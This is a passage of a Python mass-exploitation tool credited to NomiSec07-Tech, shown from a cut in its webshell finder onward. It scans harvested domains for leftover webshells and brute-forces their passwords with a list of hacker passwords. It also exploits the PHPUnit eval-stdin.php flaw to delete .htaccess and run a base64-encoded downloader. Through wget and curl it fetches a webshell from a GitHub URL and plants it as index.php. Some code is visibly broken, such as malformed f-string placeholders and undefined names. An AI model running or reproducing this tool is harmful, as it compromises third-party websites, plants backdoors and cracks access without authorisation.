srx.php','sym.php','sym403.php','t.php','tes.php','tesla.php','teslav.php','test.php','tshop.php','twin.php','u.php','upload.php','uploader.php','usb.php','usr.php','utchiha.phP','v3.php','v4.php','vuln.php','w3llstore.php','wp-2019.php','wp-admin.php','wp-content/mu-plugins-old/index.php','wp-content/themes/twentytwentytwo/index.php','wp-defaul.php','wp-includes/fonts/dev.php','wp-includes/fonts/iq.php','wp-includes/fonts/iqb.php','wp-info.php','wp-mails.php','wp-one.php','wp-pluging.php','wp-plugins.php','wp-rss.php','wp-singupp.php','wp-site.php','wp-system.php','wp-title.php','wp-we.php','wp.php','wp/wp-includes/fonts/dev.php','wp/wp-includes/fonts/iqb.php','wpindex.php','ws.php','wsanon.php','WSO.php','wso.php','wso1.php','wso1337.php','wso2.php','xcv.php','xidcm.php','xindex.php','xleet.php','xm.php','xx.php','XxX.php','xxx.php','y.php','z.php','zk.php','zone.php?phpshell','zx.php','symlink.php','c99.php','ok.php','2.php','3.php','4.php','6.php','7.php','8.php','9.php','10.php','p.php','q.php','d.php','f.php','g.php','h.php','j.php','wp-wso.php','minimo.php','V3.php','V5.php','www.php','100.php','777.php','xox.php','new.php','wi.php','nee.php','87.php','haxor.php','FoxWSOv1.php','bb.php','lf.php','hello.php','if.php','kn.php','3301.php','anone.php','wp-configer.php','wp-ad.php','send.php','.wp-cache.php','sendmail.php','rahma.php','nasgor.php','alfa123.php']
        for xox in listaa :
            url = ("http://"+i+"/"+xox)
            url2 = ("https://"+i+"/"+xox)
            req = x.get(url, headers=head, timeout=7, verify=False).text
            req = x.get(url2, headers=head, timeout=7, verify=False).text
            if "border:none;background-color:#1e252e;color:#fff;cursor:pointer;" in req or "name='watching' value='submit'" in req or "name='watching' value='>>'" in req or "<form method=post><input type=password name=pass>" in req or "<input type=password name=pass><input type=submit" in req or "method=post>Password:" in req :
                print(fw+"["+fg+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fg+" Found Shell")
                
                open("result/shellpw.txt","a").write(url+"\n")
                listpw = ['admin','stusa','xleet','x505','damedesuyo8800','am*guAW8.ryDgz-TYF','Stusa','friv','fuck666','','****','*****','Haxor?1337','haxor','Haxor','imunify1337','Malyo1@8','31337','00w1wcRT','022627raflixsec','123','123456','12qwaszx','1337','133721','1n73ction','22XC','404','555','731','a5e8z77','abcder','achan','adminhoki','aerul','akudimana','alfa','anggie21','AnonGhost','AnonymousFox','asdsdggenu','awokawok2','b374k','b3t4kun','BangPat?1337','banyumas','bheart2206','cantik','cmonqwe123#@!','con7extshell','cyb3r','DapsquaD','DeadSec','default','elena','fff132f70f28194','G00DV1N','geronimo123','gfus','ghost287','HACKED','hacker0882','hackmeDON','Hasilhoki','haurgeulis','haxor34','huypizdaprovoda','hxr1337','iamtheking','IndexAttacker','IndoSec','IndoXploit','JH23FVDG32FD','jupiter2709','katib','kem','kontolcokasu','kontolgaceng','kontoll471','kpxwbYBP4hQK','l o l','leksak98@','letmeinmobile','mad','memes','mini-shell','Mo2a0123','mravast','myrepublic','oppaidragon','password','peler','peler666','Penolong40','phpshell','phpshells','pucek12345','r00t','r00tsh3ll','rbbd95','RFkyy','root','root@kudajumping','Sandra@1199','sys123','T1KUS90T','tbl','thopik123','tunafeesh','w0rms','xmina','zaza','zeeblaxx','{ IndoSec }']
                for pw in listpw :
                    tor = ("http://"+i+"/"+xox+"#"+pw)
                    cek = x.post(url, headers=head, data={'pass': pw, 'watching': 'submit'}, timeout=7, verify=False).text
                    cek = x.post(url2, headers=head, data={'pass': pw, 'watching': 'submit'}, timeout=7, verify=False).text
                    cek = x.post(url, headers=head, data={'pass': pw, 'watching': '>>'}, timeout=7, verify=False).text
                    cek = x.post(url2, headers=head, data={'pass': pw, 'watching': '>>'}, timeout=7, verify=False).text
                    if "-rw-r--r--" in cek or ">File manager<" in cek or ">Upload file:" in cek or "drwxr-xr-x" in cek or "-rw-rw-rw-" in cek or "drwxrwxrwx" in cek or "Upload File :" in cek or "Writeable" in cek :
                        print(fw+"["+fg+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fg+" Found Pass Shell")
                        open("result/shell.txt","a").write(url+"#"+pw+"\n")
                        open("result/shellcracked.txt","a").write(url+"#"+pw+"\n")
                        break
                    else :
                        print(fw+"["+fr+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fr+" Not Found Pass Shell")
                break
            elif ">File manager<" in req or "Cpanel Reset Password" in req or "WebRooT" in req or "PHP File Manager" in req or '<font color="red"><center> Shell :'in req or '<font color="green"><center> Up :' in req or "Haxgeno7" in req or "H3NING_MAL4M" in req or "?x=cmd&d=" in req or "aDriv4" in req or "<input type='submit' value='Submit'" in req or "Upload file :" in req or "uk45" in req or "-rwxrwxrwx" in req or "drwxr-x---" in req or "-rwxr-xr-x" in req or "#0x2525" in req or "#0x2515" in req or "-rw-rw-r--" in req or "Mini Shell" in req or "=== bbPress ===" in req or "Priv8 Home Root Uploader by Mrcakil" in req or "root@indoxploit" in req or "&mode=upload'>Upload file</a></td>" in req or "<input type=file name=f><input name=k type=submit id=k value=upload>" in req or 'name="_upl" type="submit" id="_upl" value="Upload"' in req or "trenggalek6etar" in req or "D3xterR00t" in req or "-r--r--r--" in req or "PHP Uploader - By Phenix-TN & Mr.Anderson" in req or '<option value="/tmp/">' in req or 'name="_upl"' in req and 'id="_upl"' in req and 'value="Upload"' in req or 'Sh3ll' in req or "Sh3ll By Anons79" in req or "CCAEF Uploader" in req or ">Upload file:" in req or "RevoLutioN Namesis" in req or "okokok" in req or 'value="Upload"></form>' in req or '<title>[ RC-SHELL' in req or '<option value="create_symlink">' in req or "Vuln!! patch it Now!" in req or "WSO 4.2.5<" in req or "Ghost Exploiter Team Official" in req or ">PHP File Manager<" in req or "1975 Team" in req or '&upload=gaskan">Upload File<' in req or 'name="_upl"' in req and 'id="_upl"' in req or "-rw-r--r--" in req or "drwxr-xr-x" in req or "-rw-rw-rw-" in req or "drwxrwxrwx" in req or "Owner/Group" in req or ">[ Home Shell ]<" in req or "Upload File : " in req or 'name="uploader" id="uploader"' in req or "l7WADead" in req or '<input type="submit" name="submit" value="Upload">' in req or "(Writeable)" in req or "NowMeee" in req :
                Good = Good + 1
                print(fw+"["+fg+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fg+" Found Shell")
                
                open("result/shell.txt","a").write(url+"\n")
            else :
                print(fw+"["+fr+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fr+" Not Found Shell")
    except :
        pass

# Fungsi phpunit
def phpunit1(i):
    global Good
    head = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    try:
        x = requests.session()
        listaa = ['/vendor/phpunit/phpunit/src/Util/PHP/',
                  '/laravel/vendor/phpunit/phpunit/src/Util/PHP/',
                  '/api/vendor/phpunit/phpunit/src/Util/PHP/',
                  '/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/',
                  '/modules/autoupgrade/vendor/phpunit/phpunit/src/Util/PHP/']
        for xox in listaa:
            url = ("http://" + i + xox + "eval-stdin.php")
            data = "<?php phpinfo(); ?>"
            cmd = x.get(url, data=data, timeout=15, verify=False)
            if "PHP License as published by the PHP Group" in cmd.text:
                print("[checker] " + i + " <=> Found Phpunit")
                open("result/phpunit.txt", "a").write(url + "\n")
                data2 = "<?php system('rm .htaccess') ?>"
                x.get(url, data=data2, timeout=15, verify=False)
                data3 = "<?php eval('?>'.base64_decode('PD9waHAKZnVuY3Rpb24gYWRtaW5lcigkdXJsLCAkaXNpKSB7CgkkZnAgPSBmb3BlbigkaXNpLCAidyIpOwoJJGNoID0gY3VybF9pbml0KCk7CgljdXJs_XNldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKCWN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9CSU5BUllUUkFOU0ZFUiwgdHJ1ZSk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTN3C8XR9mxKMjYCxjQ35FGjzvimsfBByNgQoJGNoLCBDVVJMTN3C8XR9mxKMjYCxjQ35FGjzvimsfBByNgk7CgljdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRklMRSwgJGZwKTN3C8XR9mxKMjYCxjQ35FGjzvimsfBByNgKCWN1cmxfY2xvc2UoJGNoKTN3C8XR9mxKMjYCxjQ35FGjzvimsfBByNgoKTsKCWZsdXNoKCk7Cn0KaWYoYWRtaW5lcigiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL292cnRobmtuZy9jb2svbWFpbi91cCIsImluZGV4LnBocCIpKSB7CgllY2hvICJCYW5kdW5nWHBsb2l0ZXIiOwp9IGVsc2UgewoJZWNobyAiZmFpbCI7Cn0KPz4=')); ?>"
                x.get(url, data=data3, timeout=15, verify=False)
                data4 = "<?php system('wget https://raw.githubusercontent.com/ovrthnkng/cok/main/up -qO index.php');"
                x.get(url, data=data4, timeout=15, verify=False)
                data5 = "<?php system('curl -s https://raw.githubusercontent.com/ovrthnkng/cok/main/up -o index.php');"
                x.get(url, data=data5, timeout=15, verify=False)
                url2 = ("http://" + i + xox + "index.php?bx=0e215962017")
                spawn = x.get(url2, headers=head)
                if "NomiSec07-Tech" in spawn.text:
                    Good = Good + 1
                    print(fw+"["+fg+"checker"+fw+"] "+fw+i+" "+fw+"<=>"+fg+" Found Phpunit Shell")
                    open("result/shell.txt","a").write(url2+"\n")
                    break
                else :
                    print(fw+"["+fr+"checker"+fw+"] "+fw+i+" "+fw+"=>"+fr+" Not Vuln Phpunit")
            else :
                print(fw+"["+fr+"checker"+fw+"] "+fw+i+" "+fw+"=>"+fr+" Not Found Phpunit")
    except :
        pass

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
}

# Input API key
api_key = getpass.getpass("Enter your API key:nomi-Kxc5m")

# Fungsi untuk menemukan subdomain
def find_subdomains(domain, api_key):
    url = f"https://v1.nomisec07.site/api/subdomain_finder?domain={domain}&apikey={nomi-Kxc5m}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            subdomains = data.get("subdomains", [])
            return subdomains
    except Exception:
        pass
    return []

# Fungsi untuk mendapatkan daftar domain
def get_domain_list(query, extension, auto_reverse_ip, scan_cms_option, country=""):
    visited_domains = set()

    def is_wordpress(domain):
        wp_login_url = "http://{}/wp-login.php".format(domain)
        try:
            response = requests.head(wp_login_url, headers=headers, timeout=10)
            if response.status_code != 200:
                return False
            wp_main_url = "http://{}".format(domain)
            response = requests.get(wp_main_url, headers=headers, timeout=10)
            if "Powered by WordPress" in response.text:
                return True
        except requests.exceptions.Timeout:
            pass
        except requests.exceptions.RequestException as e:
            if "[×] No address associated with hostname" in str(e):
                print("[×] {}: Domain not hosted".format(domain))
                return False
            pass
        return False

    def scan_cms(domain):
        try:
            s = requests.Session()
            req = s.get("http://" + domain, headers=headers, timeout=8)
            html = req.text
            if "/wp-content/" in html:
                nama = "Wordpress"
                w = open("cms/wordpress.txt", "a")
                r = open("cms/wordpress.txt").read()
                if domain in r:
                    print(domain + " -> \033[31;1m" + nama + "\033[0m")
                else:
                    print(domain + " -> \033[32;1m" + nama + "\033[0m")
                    w.write(domain + "\n")
                w.close()
            else:
                print(domain + " -> \033[33;1mOther\033[0m")
                with open("cms/other.txt", "a") as file:
                    file.write(domain + "\n")
        except requests.exceptions.Timeout:
            pass
        except requests.exceptions.RequestException as e:
            if "Connection aborted" in str(e):
                return
            pass

    def get_ip_for_domain(domain):
        url = f"https://v1.nomisec07.site/api/domain_to_ip?url={domain}&apikey={nomi-Kxc5m}"
        try:
            response = requests.get(url)
            if response.status_code == 200:
                data = response.json()
                ip = data.get("Result", "")
                return ip
        except Exception:
            pass
        return None

    def reverse_ip_to_domains(ip):
        url = f"https://v1.nomisec07.site/api/v2/reverseip?ip={ip}&apikey={nomi-Kxc5m}"
        try:
            response = requests.get(url)
            if response.status_code == 200:
                data = response.json()
                domains = data.get("domains", [])
                return domains
        except Exception:
            pass
        return []

    def worker(queue):
        while True:
            domain = queue.get()
            if domain is None:
                break
            try:
                if is_wordpress(domain):
                    with open("cms/wordpress.txt", "a") as file:
                        file.write(domain + "\n")
                if scan_cms_option:
                    scan_cms(domain)
                if auto_reverse_ip:
                    ip = get_ip_for_domain(domain)
                    if ip:
                        domains = reverse_ip_to_domains(ip)
                        if domains:
                            result_file.writelines([f"{d}\n" for d in domains])
                # Tambahkan penulisan ke nomi-result.txt di luar periksa opsi auto_reverse_ip dan scan_cms_option
                with open("nomi-result.txt", "a") as result_file:
                    result_file.write(domain + "\n")
            except Exception as e:
                pass
            queue.task_done()

    if not os.path.exists("cms"):
        os.makedirs("cms")
    if not os.path.isfile("cms/other.txt"):
        open("cms/other.txt", "a").close()

    with open("nomi-result.txt", "a") as result_file:
        page = 1
        while True:
            url = "https://v1.nomisec07.site/api/domain?page={}&domain={}&zone={}&country={}&isDead=false&apikey={}".format(
                page, query, extension, country, api_key)
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                data = response.json()
                domains = [entry for entry in data["domains"]]
                new_domains = set(domains) - visited_domains
                visited_domains.update(new_domains)
                if not new_domains:
                    break
                queue = Queue()
                for domain in new_domains:
                    queue.put(domain)
                print("[{}] => {} domains".format(query, len(new_domains)))
                num_threads = 100
                threads = []

                for _ in range(num_threads):
                    t = Thread(target=worker, args=(queue,))
                    t.start()
                    threads.append(t)
                queue.join()
                for _ in range(num_threads):
                    queue.put(None)
                for t in threads:
                    t.join()

                page += 1
            elif response.status_code == 401 and "Unauthorized - Invalid API Key" in response.json().get("error", ""):
                print("API Key not valid. Please contact and buy on wa.me/6281345701125")
                break  # Keluar dari loop jika API key tidak valid
            else:
                print("No Domains Found")
                break

def main():
    while True:
        os.system("clear")
        print('''
                                                 
 █▀▀ █▀█ ▄▀█ █▄▄ ▄▄ ▀▄▀ █▀█ █░░ █▀█ █ ▀█▀
 █▄█ █▀▄ █▀█ █▄█ ░░ █░█ █▀▀ █▄▄ █▄█ █ ░█░
 ''')
        print("- this tools coded by y4ud")
        print("[1] — By keywordlist")
        print("[2] — By single query [ api under maintance ]")
        print("[3] — Subdomain Finder")
        print("[4] — Run PHPUnit Scanner")
        print("[5] — Run Shell finder Scanner")
        print("[6] — ShellFind/pl.alfa/laravel [ scanner auto exploit ]")
        print("[7] — Grab By Date ( new )")
        print("[8] — Reverse Ip Priv8 ( new )")
        print("[9] — Duplicates Remover")
        print("[0] — Exit")
        option = input("– Select:  ")
        
        if option == "1":
            keyword_file = input("Enter keywordlist file name : ")
            with open(keyword_file, "r") as keyword_file:
                keywords = keyword_file.read().splitlines()

            extension = input("Extension (only com) : ")
            auto_reverse_ip = input("Auto reverse IP? (Y/n): ").lower()
            if auto_reverse_ip == "n":
                auto_reverse_ip = False
            else:
                auto_reverse_ip = True
            scan_cms_option = input("Scan CMS? (Y/n): ").lower()
            if scan_cms_option == "n":
                scan_cms_option = False
            else:
                scan_cms_option = True
            country = input("Enter country code (e.g., us) or leave empty for all countries: ")

            all_domains = []

            for keyword in keywords:
                get_domain_list(keyword, extension, auto_reverse_ip, scan_cms_option, country)

        elif option == "2":
            query = input("Input query : ")
            extension = input("Extension (only com) : ")
            auto_reverse_ip = input("Auto reverse IP? (Y/n): ").lower()
            if auto_reverse_ip == "n":
                auto_reverse_ip = False
            else:
                auto_reverse_ip = True
            scan_cms_option = input("Scan CMS? (Y/n): ").lower()
            if scan_cms_option == "n":
                scan_cms_option = False
            else:
                scan_cms_option = True
            country = input("Enter country code (e.g., us) or leave empty for all countries: ")

            get_domain_list(query, extension, auto_reverse_ip, scan_cms_option, country)

        elif option == "3":
            os.system("clear")
            print('''
█▀ █░█ █▄▄ █▀▄ █▀█ █▀▄▀█ ▄▀█ █ █▄░█
▄█ █▄█ █▄█ █▄▀ █▄█ █░▀░█ █▀█ █ █░▀█

█▀▀ █ █▄░█ █▀▄ █▀▀ █▀█
█▀░ █ █░▀█ █▄▀ ██▄ █▀▄
            ''')
            domain_list_file = input("Enter File :")
            output_file = input("Enter output: ")

            with open(domain_list_file, "r") as file:
                domains = file.read().splitlines()

            subdomains_list = []
            for domain in domains:
                subdomains = find_subdomains(domain, api_key)
                print(f"Scanning {domain} Got {len(subdomains)} subdomains")
                subdomains_list.extend(subdomains)
            
            if subdomains_list:
                with open(output_file, "w") as output:
                    output.write("\n".join(subdomains_list))
                print(f"Subdomains found and saved in {output_file}")
            else:
                print("No subdomains found.")

        elif option == "4":
            phpunit1_file = input("Enter file: ")
            with open(phpunit1_file, "r") as file:
                domains = file.read().splitlines()
                for domain in domains:
                    phpunit1(domain)
                    
        elif option == "5":
             shell_find_file = input("Enter File: ")
             with open(shell_find_file, "r") as file:
                 domains = file.read().splitlines()
             for domain in domains:
                 shell_find(domain)
        elif option == "6":
            os.system("clear")
            print('''
▄▀█ █░█ ▀█▀ █▀█   █▀▀ ▀▄▀ █▀█ █░░ █▀█ █ ▀█▀
█▀█ █▄█ ░█░ █▄█   ██▄ █░█ █▀▀ █▄▄ █▄█ █ ░█░
            ''')
            exploit_file = input("Masukkan File: ")
            with open(exploit_file, "r") as file:
                domains = file.read().splitlines()

            if __name__ == '__main__':
                PoolSize = 10  # set terserah
                with multiprocessing.Pool(PoolSize) as p:
                    p.map(exploit, domains)  
                    p.map(exploit, listaa)
                    
        elif option == "7":
            print("example : 2023-09-29")
            date = input("Input Date : ")
            page = int(input("Page : "))
            until_page = int(input("Until Page : "))

            res = []

            while page <= until_page:
                url = f"https://v1.nomisec07.site/api/by-date?date={date}&startpage={page}&endpage={until_page}&apikey={nomi-Kxc5m}"
                try:
                    response = requests.get(url)
                    if response.status_code == 200:
                        data = response.json()
                        domains = data.get("Domains", [])
                        if not domains:
                            break
                        res.extend(domains)
                        for domain in domains:
                            print(domain)
                            open(f'result-{date}.txt', 'a').write(domain + "\n")
                        page += 1
                    else:
                        print(f"Failed to fetch data for page {page}")
                except Exception as e:
                    print(f"Error occurred while processing page {page}: {str(e)}")
        elif option == "8":
            os.system("clear")
            print(''' 
█▀█ █▀▀ █░█ █▀▀ █▀█ █▀ █▀▀   █ █▀█
█▀▄ ██▄ ▀▄▀ ██▄ █▀▄ ▄█ ██▄   █ █▀▀ ''')
            print("[ Priv8 - Reverse IP ] ")
            print("[ Only Ip Can to Reverse ]")
            print("— Developed By NomiSec07-Tech ( NowMeee )\n")

            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            api_url = "https://v1.nomisec07.site/api/v2/reverseip?ip={dom}&apikey={nomi-Kxc5m}"
            file_input = input("List IPs: ")
            file_result = input("Result filename: ")

            try:
                threads = int(input("Thread: "))
                if threads <= 0:
                    raise ValueError
            except ValueError:
                print("Please provide a valid number!")
                sys.exit()

            if not os.path.exists(file_result):
                open(file_result, "w").close()

            def reverse(ip):
                response = requests.get(api_url.replace("{dom}", ip).replace("{api_key}", api_key), verify=False)
                data = response.json()
                domains = data.get("domains", [])
                total_domains = len(domains)
                print(f"[+]{ip} we got {total_domains} domains")
                with open(file_result, "a", encoding="utf-8") as f:
                    for domain in domains:
                        f.write(domain + "\n")

            try:
                ips = []
                with open(file_input, "r") as f:
                    ips = f.read().splitlines()

                with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                    results = [executor.submit(reverse, ip) for ip in ips]

            except KeyboardInterrupt:
                print("\nStopped!")
            finally:
                print(f"Result saved to {file_result}")
        elif option == "9":
                    input_file = input("enter file name: ")
                    output_file = input("enter output name: ")
                    remove_duplicates(input_file, output_file)
                    print("Process Done")
            
        elif option == "0":
            print("Exiting...")
            break
        else:
            print("Invalid option")

if __name__ == "__main__":
    main()
